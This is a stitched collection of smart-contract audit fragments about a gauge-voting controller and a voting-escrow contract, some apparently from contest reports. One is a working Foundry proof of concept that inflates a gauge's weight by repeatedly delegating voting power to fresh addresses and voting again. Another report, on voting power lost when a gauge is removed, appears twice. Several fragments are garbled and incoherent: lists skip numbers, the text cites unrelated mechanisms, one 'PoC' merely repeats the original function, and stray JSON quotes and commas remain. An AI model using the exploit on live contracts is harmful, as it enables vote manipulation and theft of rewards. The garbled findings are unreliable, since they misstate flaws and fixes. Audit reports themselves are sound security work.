This loophole undermines the original purpose of the locked tokens and poses a risk to the proper functioning of the protocol.\n\nThe reason for this vulnerability is that the `vote_for_gauge_weights` function does not properly check if the new slope being recorded is already scheduled, which can cause a race condition when two or more users simultaneously vote for the same gauge. In such cases, one user may be able to undelegate their tokens before they are scheduled to expire, thereby circumventing the system's incentives and potentially causing undesired consequences.\n\nTo fix this vulnerability, it is recommended that the `vote_for_gauge_weights` function be modified to check if a new slope is already scheduled before recording it.

However, there are some potential issues and considerations that should be taken into account when evaluating this code:\n\n1. The `vote_for_gauge_weights` function allows users to vote for gauge weights. However, the function does not check if a user has already voted for the gauge or whether they have enough voting power to do so. This could be a potential vulnerability if users are able to manipulate the voting process by repeatedly calling this function with the same input parameters.\n2. The `vote_user_power` mapping is used to track the total amount of voting power (weight) that each user has used, but the code does not check for overflows or underflows when updating this value. This could lead to vulnerabilities if the contract is able to manipulate the values stored in this mapping.\n3. The `points_weight` and `points_sum` mappings are used to store the slope changes for each gauge and the total sum of slope changes, respectively. However, the code does not check for overflows or underflows when updating these values, which could lead to vulnerabilities if the contract is able to manipulate the values stored in these mappings.\n4. The `changes_weight` and `changes_sum` mappings are used to store the slope changes that have been scheduled for each gauge and the total sum of slope changes, respectively.

The `Math.max` function is used to ensure that the slope changes are always positive, but this function can be manipulated by malicious users who may try to exploit this code for their own gain. For example, a malicious user could call the `vote_for_gauge_weights` function with a negative input value for `_user_weight`, which would cause the slope change to become negative and potentially lead to vulnerabilities.\n6.

This can lead to the attacker being able to influence the outcome of the vote, potentially in a way that benefits them and not the community.\n\nThe vulnerability arises because the smart contract code updates the total voting power based on the total contributions without excluding funding fees, leading to an inflated total voting power compared to actual user-generated voting power. This discrepancy makes it impossible for users to reach unanimous decisions, as their individual votes hold less weight than they should in relation to the incorrect total voting power.\n\nTo exploit this vulnerability, an attacker would need to have advance knowledge of the outcome of a vote before other users are able to cast their votes. They could then use this information to try and influence the outcome of the vote by casting their own votes in a way that benefits them. For example, they might try to vote for something that has a high likelihood of being approved, but is not in line with the community's preferences. This would give them more power in the decision-making process than they should have, potentially leading to a different outcome than what the community intended.\n\nTo mitigate this vulnerability, the smart contract code could be modified to exclude funding fees from the total voting power calculation. This would ensure that the total voting power is accurately reflected in the decision-making process, and that users' individual votes have a more accurate weight than they do currently.

Require users to lock in their rewards before voting for gauge weights. This will prevent malicious actors from front-running the system and manipulating the vote outcomes.\n2. Implement additional checks to ensure that the user has not already voted for gauge weights in the current cycle. This can be done by storing the last time a user voted for gauge weights and comparing it to the current block timestamp. If the difference is less than 1 week, the user will be prevented from voting again.\n3. Implement a more robust incentive structure that encourages users to participate appropriately and to improve the checkpoint system by implementing additional safeguards and recording user status changes more accurately. This can include things like increasing the lock-in period for rewards, implementing penalties for malicious behavior, or providing reward bonuses for users who vote consistently and participate in the community.\n4. Implement a Proof-of-Stake (PoS) system to ensure that only users with a certain amount of locked-in tokens can vote for gauge weights. This will prevent malicious actors from front-running the system and manipulating the vote outcomes.\n5.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation",

This means that an attacker can pass a malicious contract address as the `_gauge` parameter and remove a gauge contract from the system without proper authorization.\n\nTo mitigate this vulnerability, the `remove_gauge` function should implement a system to verify the authenticity and integrity of external contracts it interacts with. This could include maintaining a whitelist of approved contract addresses, using on-chain or off-chain permission systems, or implementing decentralized identity verification mechanisms.\n\nHere is an example PoC for this vulnerability:\n```\nfunction remove_gauge(address _gauge) external onlyGovernance {\n    require(isValidGauge[_gauge], \"Invalid gauge address\");\n    isValidGauge[_gauge] = false;\n    _change_gauge_weight(_gauge, 0);\n    emit GaugeRemoved(_gauge);\n}\n```\nThe following patch can be used to mitigate this vulnerability:\n```\nfunction remove_gauge(address _gauge) external onlyGovernance {\n    require(isValidGauge[_gauge], \"Invalid gauge address\");\n    // Add a whitelist of approved contract addresses here\n    if (whitelistedContracts.contains(_gauge)) {\n        isValidGauge[_gauge] = false;\n        _change_gauge_weight(_gauge, 0);\n        emit GaugeRemoved(_gauge);\n    } else {\n        revert(\"Invalid gauge address\");\n    }\n}\n```",

Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation",

The contract's `remove_gauge` function allows removing a gauge address, which could be a reference to a Flywheel. However, it does not seem to remove the corresponding reward token asset from the reward depot, which can prevent adding a new Flywheel with the same reward token.\n\nTo mitigate this vulnerability, developers should properly implement the removal of reward token assets within the contract mechanism by ensuring that when a Flywheel is removed, its corresponding reward token asset is also removed from the reward depot. This will fully clear dependencies and prevent inconsistencies in the involved contracts and token balances.\n\nReason for answer: The vulnerability arises because the contract's `remove_gauge` function only sets a flag to indicate that the gauge address is no longer valid, but does not remove the corresponding reward token asset from the reward depot. This can cause issues when adding a new Flywheel with the same reward token, as the system would consider the reward token to still be in use.",

A malicious actor adds a gauge with a non-zero weight to the system.\n2. The gauge is then removed, causing the total weight of the gauges in the system to become incorrect.\n3. If a new cycle begins before rewards are queued for the previous cycle, the malicious actor can prevent some gauges from receiving rewards by adding them back into the system with a non-zero weight.\n4.

This can cause some gauges to receive more rewards than they would have if the malicious actor had not interfered with the system.\n6. The malicious actor can continue this attack for as long as they want, preventing certain gauges from receiving rewards and causing a Denial of Service (DOS) attack on the system.\n\nThe type of vulnerability that is most likely to be exploited in this scenario is a \"Denial of Service\" (DoS) vulnerability.",
